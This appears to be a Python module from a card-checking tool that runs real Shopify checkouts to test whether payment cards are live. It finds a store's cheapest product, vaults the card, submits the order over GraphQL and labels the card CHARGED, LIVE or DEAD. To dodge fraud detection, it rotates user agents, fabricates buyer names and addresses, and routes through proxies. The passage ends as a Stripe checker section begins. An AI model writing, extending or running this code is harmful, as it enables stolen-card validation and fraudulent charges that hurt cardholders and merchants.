"""Shopify checkout engine — advanced card check with GraphQL flow.

Flow:
  1.  GET /cart.js → initialize session, get cookies
  2.  GET /products.json → find cheapest product
  3.  POST /cart/add.js → add product to cart
  4.  POST /cart → start checkout, get checkout URL
  5.  GET checkout URL → extract sessionToken, signature, stableId
  6.  POST checkout.pci.shopifyinc.com/sessions → vault card (get vault_id)
  7.  POST /checkouts/unstable/graphql → SubmitForCompletion mutation
  8.  Poll for receipt → CHARGED / LIVE_3DS / LIVE / DEAD
"""

import re
import uuid
import random
import asyncio
import logging
import json
import time
from dataclasses import dataclass
from typing import Optional
from urllib.parse import urlparse, urlencode

import aiohttp
from aiohttp.resolver import ThreadedResolver

from core.card_parser import Card
from core.anti_detect import random_user_agent
from core.response_classifier import classify_shopify_response

logger = logging.getLogger(__name__)

_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]

_CH_UA_POOL = [
    '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    '"Chromium";v="125", "Google Chrome";v="125", "Not-A.Brand";v="99"',
]

_CH_UA_PLATFORM = ['"Windows"', '"macOS"']


def _rand_ua():       return random.choice(_UA_POOL)
def _rand_ch_ua():    return random.choice(_CH_UA_POOL)
def _rand_platform(): return random.choice(_CH_UA_PLATFORM)


def _random_address():
    first_names = ["James", "Mary", "Robert", "Patricia", "John", "Jennifer", "Michael", "Linda", "David", "Susan"]
    last_names  = ["Smith", "Jones", "Taylor", "Brown", "Williams", "Wilson", "Johnson", "Davies", "Miller", "Davis"]
    streets     = ["Maple St", "Oak Ave", "Washington Blvd", "Lakeview Dr", "Park Way", "Broadway", "Elm St", "Pine Ave"]
    cities = [
        ("Ketchikan", "AK", "99901"), ("Los Angeles", "CA", "90001"),
        ("New York", "NY", "10001"),  ("Houston", "TX", "77001"),
        ("Miami", "FL", "33101"),     ("Chicago", "IL", "60601"),
        ("Phoenix", "AZ", "85001"),   ("Seattle", "WA", "98101"),
    ]
    fn = random.choice(first_names)
    ln = random.choice(last_names)
    street = f"{random.randint(100, 9999)} {random.choice(streets)}"
    city, state, zp = random.choice(cities)
    return {
        "firstName": fn, "lastName": ln,
        "address1": street, "city": city,
        "zoneCode": state, "postalCode": zp,
        "countryCode": "US",
        "phone": f"+1703{random.randint(210, 999)}{random.randint(1000, 9999)}",
        "company": "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=5)),
    }


@dataclass
class CheckResult:
    status: str
    message: str
    gateway: str
    price: float
    store: str
    card: Card


async def shopify_check(
    card: Card,
    store_url: str,
    proxy: Optional[str] = None,
    timeout: int = 20,
    max_retries: int = 1,
) -> CheckResult:
    """Run a single Shopify card check using advanced GraphQL flow."""
    for attempt in range(max_retries + 1):
        result = await _do_shopify_check(card, store_url, proxy, timeout)
        is_network_error = any(kw in result.message for kw in ("timeout", "dns_error", "proxy_error:", "ssl_error", "connection_error:", "session_init_failed"))
        if is_network_error and attempt < max_retries:
            logger.debug("Retry %d/%d for %s", attempt + 1, max_retries, store_url)
            await asyncio.sleep(1)
            continue
        return result
    return result


async def _do_shopify_check(
    card: Card,
    store_url: str,
    proxy: Optional[str],
    timeout: int,
) -> CheckResult:
    """Internal: single Shopify check attempt using advanced flow."""
    if not store_url.startswith("http"):
        store_url = "https://" + store_url
    store_url = store_url.rstrip("/")

    ua = _rand_ua()
    ch_ua = _rand_ch_ua()
    platform = _rand_platform()

    base_headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "priority": "u=1, i",
        "sec-ch-ua": ch_ua,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": platform,
        "user-agent": ua,
    }

    conn_timeout = aiohttp.ClientTimeout(total=timeout)
    connector = aiohttp.TCPConnector(limit=0, ssl=False, resolver=ThreadedResolver())
    session_kwargs = {"timeout": conn_timeout, "connector": connector}
    if proxy:
        session_kwargs["proxy"] = proxy

    try:
        async with aiohttp.ClientSession(**session_kwargs) as session:
            ctx = _CheckoutContext(store_url, ua, ch_ua, platform, base_headers)
            ctx._proxy = proxy

            # Step 1: Initialize session
            if not await _init_session(session, ctx):
                return CheckResult("DEAD", "session_init_failed", "Shopify Payments", 0.0, store_url, card)

            # Step 2: Find cheapest product
            if not await _find_cheapest_product(session, ctx):
                return CheckResult("DEAD", "no_products_found", "Shopify Payments", 0.0, store_url, card)

            # Step 3: Add to cart
            if not await _add_to_cart(session, ctx):
                return CheckResult("DEAD", "cart_failed", "Shopify Payments", ctx.price, store_url, card)

            # Step 4: Start checkout
            if not await _start_checkout(session, ctx):
                return CheckResult("DEAD", "checkout_start_failed", "Shopify Payments", ctx.price, store_url, card)

            # Step 5: Extract checkout metadata
            if not await _get_checkout_metadata(session, ctx):
                return CheckResult("DEAD", "token_extraction_failed", "Shopify Payments", ctx.price, store_url, card)

            # Step 6: Vault card
            vault_id = await _vault_card(session, ctx, card)
            if not vault_id:
                return CheckResult("DEAD", "card_vault_failed", "Shopify Payments", ctx.price, store_url, card)

            # Step 7: Submit for completion
            receipt_id = await _submit_for_completion(session, ctx, card, vault_id)
            if not receipt_id:
                return CheckResult("DEAD", "submission_rejected", "Shopify Payments", ctx.price, store_url, card)

            # Step 8: Poll for receipt
            category, detail = await _poll_for_receipt(session, ctx, receipt_id, card)

            if category == "CHARGED":
                return CheckResult("CHARGED", detail, "Shopify Payments", ctx.price, store_url, card)
            elif category == "APPROVED":
                return CheckResult("LIVE", detail, "Shopify Payments", ctx.price, store_url, card)
            elif category == "DECLINED":
                return CheckResult("DEAD", detail, "Shopify Payments", ctx.price, store_url, card)
            elif category == "LIVE_3DS":
                return CheckResult("LIVE_3DS", detail, "Shopify Payments", ctx.price, store_url, card)
            else:
                return CheckResult("DEAD", detail or "unknown_error", "Shopify Payments", ctx.price, store_url, card)

    except aiohttp.ClientHttpProxyError as e:
        return CheckResult("DEAD", f"proxy_error: {e}", "Shopify Payments", 0.0, store_url, card)
    except aiohttp.ClientProxyConnectionError as e:
        return CheckResult("DEAD", f"proxy_connection_error: {e}", "Shopify Payments", 0.0, store_url, card)
    except aiohttp.ClientConnectorDNSError:
        return CheckResult("DEAD", "dns_error", "Shopify Payments", 0.0, store_url, card)
    except aiohttp.ClientConnectorCertificateError:
        return CheckResult("DEAD", "ssl_error", "Shopify Payments", 0.0, store_url, card)
    except asyncio.TimeoutError:
        return CheckResult("DEAD", "timeout", "Shopify Payments", 0.0, store_url, card)
    except aiohttp.ClientError as e:
        return CheckResult("DEAD", f"connection_error: {e}", "Shopify Payments", 0.0, store_url, card)
    except Exception as e:
        logger.error("Unexpected error in shopify_check: %s", e, exc_info=True)
        return CheckResult("DEAD", "unknown_error", "Shopify Payments", 0.0, store_url, card)


class _CheckoutContext:
    """Holds checkout state between steps."""
    def __init__(self, base_url, ua, ch_ua, platform, base_headers):
        self.base_url = base_url
        self.ua = ua
        self.ch_ua = ch_ua
        self.platform = platform
        self.headers = base_headers
        self.variant_id = None
        self.product_id = None
        self.price = 0.0
        self.cart_token = ""
        self.checkout_id = None
        self.checkout_url = None
        self.session_token = None
        self.signature = None
        self.stable_id = str(uuid.uuid4())
        self.queue_token = None
        self.payment_method_identifier = None
        self.shop_id = "25603230"
        self.build_id = "4663384ede457d59be87980de7797171b19f2a1b"
        self.pci_build_hash = "a8e4a94"
        self.signed_handles = []
        self.graphql_base = None
        self.client_id = str(uuid.uuid4())
        self.visit_token = str(uuid.uuid4())
        self.address = _random_address()
        self._proxy = None


async def _init_session(session, ctx: _CheckoutContext) -> bool:
    """Step 1: Initialize session via /cart.js."""
    try:
        async with session.get(
            f"{ctx.base_url}/cart.js",
            headers=ctx.headers,
            timeout=aiohttp.ClientTimeout(total=15),
        ) as r:
            if r.status not in (200, 302):
                return False
            ctx.client_id = r.cookies.get("_shopify_y") or ctx.client_id
            ctx.visit_token = r.cookies.get("_shopify_s") or ctx.visit_token
            if r.status == 200:
                try:
                    data = await r.json()
                    ctx.cart_token = data.get("token", "")
                except Exception:
                    pass
            return True
    except Exception as e:
        logger.debug("init_session failed for %s: %s", ctx.base_url, e)
        return False


async def _find_cheapest_product(session, ctx: _CheckoutContext) -> bool:
    """Step 2: Find cheapest available product."""
    try:
        async with session.get(
            f"{ctx.base_url}/products.json",
            headers=ctx.headers,
        ) as r:
            if r.status != 200:
                return False
            data = await r.json()
            products = data.get("products", [])
            if not products:
                return False
            cheapest = None
            min_price = float("inf")
            for p in products:
                for v in p.get("variants", []):
                    try:
                        price = float(v.get("price", 999999))
                        if price < min_price and price > 0:
                            min_price = price
                            cheapest = v
                            ctx.product_id = p["id"]
                    except (ValueError, KeyError):
                        continue
            if cheapest:
                ctx.variant_id = cheapest["id"]
                ctx.price = min_price
                return True
            return False
    except Exception as e:
        logger.debug("find_cheapest_product failed for %s: %s", ctx.base_url, e)
        return False


async def _add_to_cart(session, ctx: _CheckoutContext) -> bool:
    """Step 3: Add product to cart."""
    headers = ctx.headers.copy()
    headers["content-type"] = "application/x-www-form-urlencoded; charset=UTF-8"
    headers["accept"] = "application/json, text/javascript, */*; q=0.01"
    headers["x-requested-with"] = "XMLHttpRequest"
    headers["origin"] = ctx.base_url
    data = {"id": str(ctx.variant_id), "quantity": "1", "form_type": "product", "utf8": "✓"}
    try:
        async with session.post(
            f"{ctx.base_url}/cart/add.js",
            data=data,
            headers=headers,
        ) as r:
            if r.status == 200:
                try:
                    j = await r.json()
                    ctx.cart_token = j.get("cart_token", ctx.cart_token)
                except Exception:
                    pass
                return True
            return False
    except Exception as e:
        logger.debug("add_to_cart failed for %s: %s", ctx.base_url, e)
        return False


async def _start_checkout(session, ctx: _CheckoutContext) -> bool:
    """Step 4: Start checkout via POST /cart."""
    headers = ctx.headers.copy()
    headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
    headers["content-type"] = "application/x-www-form-urlencoded"
    headers["cache-control"] = "max-age=0"
    headers["origin"] = ctx.base_url
    headers["referer"] = f"{ctx.base_url}/cart"
    headers["sec-fetch-dest"] = "document"
    headers["sec-fetch-mode"] = "navigate"
    headers["sec-fetch-user"] = "?1"
    headers["upgrade-insecure-requests"] = "1"
    data = f"updates%5B%5D=1&checkout=&cart_token={ctx.cart_token or ''}"
    try:
        async with session.post(
            f"{ctx.base_url}/cart",
            data=data,
            headers=headers,
            allow_redirects=True,
        ) as r:
            ctx.checkout_url = str(r.url)
            match = re.search(r"/checkouts/(?:cn/)?([a-zA-Z0-9]+)", ctx.checkout_url)
            if match:
                ctx.checkout_id = match.group(1)
                return True
            return False
    except Exception as e:
        logger.debug("start_checkout failed for %s: %s", ctx.base_url, e)
        return False


async def _get_checkout_metadata(session, ctx: _CheckoutContext) -> bool:
    """Step 5: Extract sessionToken, signature, stableId from checkout page."""
    headers = ctx.headers.copy()
    headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
    headers["sec-fetch-dest"] = "document"
    headers["sec-fetch-mode"] = "navigate"
    headers["sec-fetch-site"] = "same-origin"
    headers["upgrade-insecure-requests"] = "1"
    try:
        async with session.get(ctx.checkout_url, headers=headers) as r:
            html = await r.text()

            # sessionToken
            m = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', html)
            if m:
                ctx.session_token = m.group(1)
            if not ctx.session_token:
                for pat in [
                    r'"sessionToken"\s*:\s*"(AAEB[^"]+)"',
                    r"'sessionToken'\s*:\s*'(AAEB[^']+)'",
                    r'sessionToken[\s:=]+["\']?(AAEB[A-Za-z0-9_\-]+)',
                    r'(AAEB[A-Za-z0-9_\-]{30,})',
                ]:
                    m = re.search(pat, html)
                    if m:
                        ctx.session_token = m.group(1)
                        break

            # signature
            for pat in [
                r'"shopifyPaymentRequestIdentificationSignature"\s*:\s*"(eyJ[^"]+)"',
                r'"identificationSignature"\s*:\s*"(eyJ[^"]+)"',
                r'"paymentsSignature"\s*:\s*"(eyJ[^"]+)"',
                r'"signature"\s*:\s*"(eyJ[^"]+)"',
                r'(eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',
            ]:
                m = re.search(pat, html)
                if m:
                    ctx.signature = m.group(1)
                    break

            # stableId
            for pat in [
                r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
                r'stableId[\s:=]+["\']([0-9a-f-]{36})',
            ]:
                m = re.search(pat, html)
                if m:
                    ctx.stable_id = m.group(1)
                    break

            # queueToken
            m = re.search(r'queueToken&quot;:&quot;([^&]+)&quot;', html)
            if not m:
                m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', html)
            ctx.queue_token = m.group(1) if m else None

            # paymentMethodIdentifier
            m = re.search(r'paymentMethodIdentifier&quot;:&quot;([^&]+)&quot;', html)
            if not m:
                m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', html)
            ctx.payment_method_identifier = m.group(1) if m else None

            # shopId
            m = re.search(r'"shopId"\s*:\s*(\d+)', html)
            if not m:
                m = re.search(r'shop_id[\s:=]+(\d+)', html)
            ctx.shop_id = m.group(1) if m else "25603230"

            # buildId
            m = re.search(r'"buildId"\s*:\s*"([a-f0-9]{40})"', html)
            if not m:
                m = re.search(r'/build/([a-f0-9]{40})/', html)
            ctx.build_id = m.group(1) if m else ctx.build_id

            # PCI build hash
            pci_m = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', html)
            ctx.pci_build_hash = pci_m.group(1) if pci_m else ctx.pci_build_hash

            # signedHandles
            signed_handles = re.findall(r'"signedHandle"\s*:\s*"([^"]+)"', html)
            if not signed_handles:
                raw = re.findall(r'\\"signedHandle\\":\\"([^\\"]+)', html)
                signed_handles = [h.replace("\\n", "").replace("\\r", "") for h in raw]
            ctx.signed_handles = signed_handles

            # graphql base
            parsed = urlparse(ctx.checkout_url)
            if "shopify.com" in parsed.netloc and "checkout." in parsed.netloc:
                ctx.graphql_base = f"{parsed.scheme}://{parsed.netloc}"
            else:
                ctx.graphql_base = ctx.base_url

            return bool(ctx.session_token)
    except Exception as e:
        logger.debug("get_checkout_metadata failed: %s", e)
        return False


async def _vault_card(session, ctx: _CheckoutContext, card: Card) -> Optional[str]:
    """Step 6: Vault card via checkout.pci.shopifyinc.com/sessions."""
    address = ctx.address
    url = "https://checkout.pci.shopifyinc.com/sessions"
    headers = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://checkout.pci.shopifyinc.com",
        "referer": f"https://checkout.pci.shopifyinc.com/build/{ctx.pci_build_hash}/number-ltr.html?identifier=&locationURL={ctx.checkout_url or ''}",
        "sec-ch-ua": ctx.ch_ua,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": ctx.platform,
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": ctx.ua,
        "priority": "u=1, i",
    }
    if ctx.signature:
        headers["shopify-identification-signature"] = ctx.signature

    payload = {
        "credit_card": {
            "number": card.number,
            "month": int(card.month),
            "year": int(card.year),
            "verification_value": card.cvv,
            "start_month": None,
            "start_year": None,
            "issue_number": "",
            "name": f"{address['firstName']} {address['lastName']}",
        },
        "payment_session_scope": urlparse(ctx.base_url).netloc,
    }

    try:
        async with session.post(url, json=payload, headers=headers) as r:
            if r.status in (200, 201):
                data = await r.json()
                vault_id = data.get("id")
                if vault_id:
                    return vault_id
                # 200 but no id — check for error in body
                error = data.get("error", "")
                if error:
                    logger.debug("vault_card error: %s", error)
                return None
            return None
    except Exception as e:
        logger.debug("vault_card failed: %s", e)
        return None


_SUBMIT_MUTATION = 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}...on PendingTermViolation{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}'

_POLL_QUERY = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}'


async def _submit_for_completion(session, ctx: _CheckoutContext, card: Card, vault_id: str) -> Optional[str]:
    """Step 7: SubmitForCompletion GraphQL mutation."""
    if not ctx.session_token:
        return None

    url = f"{ctx.graphql_base}/checkouts/unstable/graphql"
    headers = ctx.headers.copy()
    headers["accept"] = "application/json"
    headers["content-type"] = "application/json"
    headers["origin"] = ctx.base_url
    headers["referer"] = ctx.checkout_url
    headers["shopify-checkout-client"] = "checkout-web/1.0"
    headers["shopify-checkout-source"] = f'id="{ctx.checkout_id}", type="cn"'
    headers["x-checkout-one-session-token"] = ctx.session_token
    headers["x-checkout-web-deploy-stage"] = "production"
    headers["x-checkout-web-server-handling"] = "fast"
    headers["x-checkout-web-server-rendering"] = "yes"
    headers["x-checkout-web-source-id"] = ctx.checkout_id
    headers["x-checkout-web-build-id"] = ctx.build_id

    address = ctx.address
    attempt_token = f"{ctx.checkout_id}-uaz{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=9))}"
    card_bin = card.number[:8]
    buyer_email = f"{address['firstName'].lower()}{random.randint(10, 99)}@gmail.com"
    delivery_expectation_lines = [{"signedHandle": sh} for sh in ctx.signed_handles]
    pm_identifier = ctx.payment_method_identifier or vault_id

    payload = {
        "query": _SUBMIT_MUTATION,
        "operationName": "SubmitForCompletion",
        "variables": {
            "attemptToken": attempt_token,
            "metafields": [],
            "analytics": {
                "requestUrl": ctx.checkout_url,
                "pageId": str(uuid.uuid4()).upper(),
            },
            "input": {
                "checkpointData": None,
                "sessionInput": {"sessionToken": ctx.session_token},
                "queueToken": ctx.queue_token,
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": {
                    "deliveryLines": [{
                        "destination": {
                            "streetAddress": {
                                "address1": address["address1"],
                                "address2": "",
                                "city": address["city"],
                                "countryCode": address["countryCode"],
                                "postalCode": address["postalCode"],
                                "company": address.get("company", ""),
                                "firstName": address["firstName"],
                                "lastName": address["lastName"],
                                "zoneCode": address["zoneCode"],
                                "phone": address["phone"],
                                "oneTimeUse": False,
                            }
                        },
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyMatchingConditions": {
                                "estimatedTimeInTransit": {"any": True},
                                "shipments": {"any": True},
                            },
                            "options": {"phone": address["phone"]},
                        },
                        "targetMerchandiseLines": {"lines": [{"stableId": ctx.stable_id}]},
                        "deliveryMethodTypes": ["SHIPPING"],
                        "expectedTotalPrice": {"any": True},
                        "destinationChanged": True,
                    }],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True,
                },
                "deliveryExpectations": {
                    "deliveryExpectationLines": delivery_expectation_lines,
                },
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": ctx.stable_id,
                        "merchandise": {
                            "productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{ctx.variant_id}",
                                "variantId": f"gid://shopify/ProductVariant/{ctx.variant_id}",
                                "properties": [],
                                "sellingPlanId": None,
                                "sellingPlanDigest": None,
                            }
                        },
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"any": True},
                        "lineComponentsSource": None,
                        "lineComponents": [],
                    }]
                },
                "memberships": {"memberships": []},
                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [{
                        "paymentMethod": {
                            "directPaymentMethod": {
                                "paymentMethodIdentifier": pm_identifier,
                                "sessionId": vault_id,
                                "billingAddress": {
                                    "streetAddress": {
                                        "address1": address["address1"],
                                        "address2": "",
                                        "city": address["city"],
                                        "countryCode": address["countryCode"],
                                        "postalCode": address["postalCode"],
                                        "company": address.get("company", ""),
                                        "firstName": address["firstName"],
                                        "lastName": address["lastName"],
                                        "zoneCode": address["zoneCode"],
                                        "phone": address["phone"],
                                    }
                                },
                                "cardSource": None,
                            },
                            "giftCardPaymentMethod": None,
                            "redeemablePaymentMethod": None,
                            "walletPaymentMethod": None,
                            "walletsPlatformPaymentMethod": None,
                            "localPaymentMethod": None,
                            "paymentOnDeliveryMethod": None,
                            "paymentOnDeliveryMethod2": None,
                            "manualPaymentMethod": None,
                            "customPaymentMethod": None,
                            "offsitePaymentMethod": None,
                            "customOnsitePaymentMethod": None,
                            "deferredPaymentMethod": None,
                            "customerCreditCardPaymentMethod": None,
                            "paypalBillingAgreementPaymentMethod": None,
                            "remotePaymentInstrument": None,
                        },
                        "amount": {"any": True},
                    }],
                    "billingAddress": {
                        "streetAddress": {
                            "address1": address["address1"],
                            "address2": "",
                            "city": address["city"],
                            "countryCode": address["countryCode"],
                            "postalCode": address["postalCode"],
                            "company": address.get("company", ""),
                            "firstName": address["firstName"],
                            "lastName": address["lastName"],
                            "zoneCode": address["zoneCode"],
                            "phone": address["phone"],
                        }
                    },
                    "creditCardBin": card_bin,
                },
                "buyerIdentity": {
                    "customer": {
                        "presentmentCurrency": "USD",
                        "countryCode": "US",
                    },
                    "email": buyer_email,
                    "emailChanged": False,
                    "phoneCountryCode": "US",
                    "marketingConsent": [
                        {"sms": {"consentState": "DECLINED", "value": address["phone"], "countryCode": "US"}},
                        {"email": {"consentState": "GRANTED", "value": buyer_email}},
                    ],
                    "shopPayOptInPhone": {
                        "number": address["phone"],
                        "countryCode": "US",
                    },
                    "rememberMe": False,
                    "setShippingAddressAsDefault": False,
                },
                "tip": {"tipLines": []},
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": {"any": True},
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": [],
                },
                "note": {
                    "message": None,
                    "customAttributes": [
                        {"key": "gorgias.guest_id", "value": ctx.client_id or ""},
                        {"key": "gorgias.session_id", "value": str(uuid.uuid4())},
                    ],
                },
                "localizationExtension": {"fields": []},
                "shopPayArtifact": {
                    "optIn": {
                        "vaultEmail": "",
                        "vaultPhone": address["phone"],
                        "optInSource": "REMEMBER_ME",
                    }
                },
                "nonNegotiableTerms": None,
                "scriptFingerprint": {
                    "signature": None,
                    "signatureUuid": None,
                    "lineItemScriptChanges": [],
                    "paymentScriptChanges": [],
                    "shippingScriptChanges": [],
                },
                "optionalDuties": {"buyerRefusesDuties": False},
                "captcha": None,
                "cartMetafields": [],
            },
        },
    }

    max_retries = 12
    for attempt in range(max_retries):
        try:
            async with session.post(url, json=payload, headers=headers) as r:
                try:
                    res = await r.json()
                except Exception:
                    return None

                if "errors" in res and res.get("data") is None:
                    return None

                data = res.get("data", {})
                submit = data.get("submitForCompletion", {})
                typename = submit.get("__typename", "")

                if typename in ("SubmitSuccess", "SubmitAlreadyAccepted", "SubmittedForCompletion"):
                    receipt = submit.get("receipt", {})
                    return receipt.get("id")

                elif typename == "SubmitFailed":
                    return None

                elif typename == "Throttled":
                    poll_after = submit.get("pollAfter", 1000)
                    ctx.queue_token = submit.get("queueToken", ctx.queue_token)
                    await asyncio.sleep(poll_after / 1000.0)
                    payload["variables"]["input"]["queueToken"] = ctx.queue_token
                    continue

                elif typename == "CheckpointDenied":
                    return None

                elif typename == "SubmitRejected":
                    errors = submit.get("errors", [])
                    codes = [e.get("code", "") for e in errors]
                    if "WAITING_PENDING_TERMS" in codes:
                        await asyncio.sleep(0.5)
                        continue
                    return None

                else:
                    backoff = min(0.5 * (1.5 ** attempt), 10.0)
                    await asyncio.sleep(backoff)
                    if attempt < max_retries - 1:
                        continue
                    return None
        except Exception as e:
            logger.debug("submit_for_completion attempt %d failed: %s", attempt, e)
            backoff = min(0.5 * (1.5 ** attempt), 10.0)
            await asyncio.sleep(backoff)

    return None


async def _poll_for_receipt(session, ctx: _CheckoutContext, receipt_id: str, card: Card) -> tuple:
    """Step 8: Poll for receipt status. Uses its own session with long timeout."""
    url = f"{ctx.graphql_base}/checkouts/unstable/graphql"
    headers = ctx.headers.copy()
    headers["accept"] = "application/json"
    headers["content-type"] = "application/json"
    headers["referer"] = ctx.checkout_url
    headers["shopify-checkout-client"] = "checkout-web/1.0"
    headers["shopify-checkout-source"] = f'id="{ctx.checkout_id}", type="cn"'
    headers["x-checkout-one-session-token"] = ctx.session_token
    headers["x-checkout-web-deploy-stage"] = "production"
    headers["x-checkout-web-server-handling"] = "fast"
    headers["x-checkout-web-server-rendering"] = "no"
    headers["x-checkout-web-source-id"] = ctx.checkout_id
    headers["x-checkout-web-build-id"] = ctx.build_id

    poll_payload = {
        "query": _POLL_QUERY,
        "operationName": "PollForReceipt",
        "variables": {
            "receiptId": receipt_id,
            "sessionToken": ctx.session_token,
        },
    }

    # Create a separate session with long timeout for polling
    poll_connector = aiohttp.TCPConnector(limit=0, ssl=False, resolver=ThreadedResolver())
    poll_session_kwargs = {
        "timeout": aiohttp.ClientTimeout(total=120),
        "connector": poll_connector,
    }
    if ctx._proxy:
        poll_session_kwargs["proxy"] = ctx._proxy

    async with aiohttp.ClientSession(**poll_session_kwargs) as poll_session:
        for i in range(15):
            try:
                async with poll_session.post(url, json=poll_payload, headers=headers) as r:
                    data = await r.json()
                    receipt = data.get("data", {}).get("receipt", {})
                tn = receipt.get("__typename", "")

                if tn == "ProcessedReceipt" or "orderIdentity" in receipt:
                    order_id = receipt.get("orderIdentity", {}).get("id", "N/A")
                    return ("CHARGED", f"Order ID: {order_id}")

                elif tn == "ActionRequiredReceipt":
                    action = receipt.get("action", {})
                    action_url = action.get("url", "") or action.get("offsiteRedirect", "")
                    if not action_url and action.get("challengeData"):
                        try:
                            cdata = json.loads(action["challengeData"])
                            action_url = cdata.get("acsUrl", "") or cdata.get("url", "")
                        except Exception:
                            action_url = str(action.get("challengeData", ""))
                    if action_url:
                        return ("LIVE_3DS", "3ds_required")
                    return ("LIVE_3DS", "3ds_challenge_unparsed")

                elif tn == "FailedReceipt":
                    err = receipt.get("processingError", {})
                    code = err.get("code", "UNKNOWN")
                    msg = err.get("messageUntranslated", "")
                    return _classify_failure(code, msg)

                elif tn in ("ProcessingReceipt", "WaitingReceipt"):
                    delay = receipt.get("pollDelay", 4000)
                    await asyncio.sleep(delay / 1000.0)
                    continue

            except Exception as e:
                logger.debug("poll_for_receipt attempt %d failed: %s", i, e)
            await asyncio.sleep(3)

    return ("ERROR", "Polling timed out")


def _classify_failure(code: str, msg: str) -> tuple:
    """Classify a payment failure response."""
    code_lower = (code or "").lower()
    msg_lower = (msg or "").lower()

    LIVE_CODES = {"insufficient_funds", "call_issuer", "do_not_honor", "pickup_card", "test_mode_live_card"}
    DEAD_CODES = {
        "card_declined", "incorrect_cvc", "invalid_cvc", "invalid_number",
        "expired_card", "generic_decline", "processor_declined", "fraudulent",
        "stolen_card", "lost_card", "invalid_expiry_month", "invalid_expiry_year",
        "blocked", "security_violation", "invalid_zip", "incorrect_number",
        "card_velocity_exceeded", "rejected",
    }

    # Exact match on code first
    if code_lower in LIVE_CODES:
        return ("APPROVED", f"{code} — {msg}")
    if code_lower in DEAD_CODES:
        return ("DECLINED", f"{code} — {msg}")

    # Then check message as substring (less precise but catches edge cases)
    for lc in LIVE_CODES:
        if lc in msg_lower:
            return ("APPROVED", f"{code} — {msg}")
    for dc in DEAD_CODES:
        if dc in msg_lower:
            return ("DECLINED", f"{code} — {msg}")

    if code and code != "UNKNOWN":
        return ("DECLINED", f"{code} — {msg}")
    return ("DECLINED", msg or "unknown_decline")


# ═════════════════════════════════════════════════════════════════════════
# STRIPE CHECK — $1 auth via Stripe secret key
# ═════════════════════════════════════════════════════════════════════════

STRIPE_ERROR_MAP = {
    "succeeded":              ("CHARGED", "succeeded"),
    "requires_action":        ("LIVE_3DS", "3ds_required"),
    "insufficient_funds":     ("LIVE", "insufficient_funds"),
    "card_declined":          ("DEAD", "card_declined"),
    "incorrect_cvc":          ("DEAD", "incorrect_cvc"),
    "invalid_number":         ("DEAD", "invalid_number"),
    "expired_card":           ("DEAD", "expired_card"),
    "processing_error":       ("DEAD", "processing_error"),
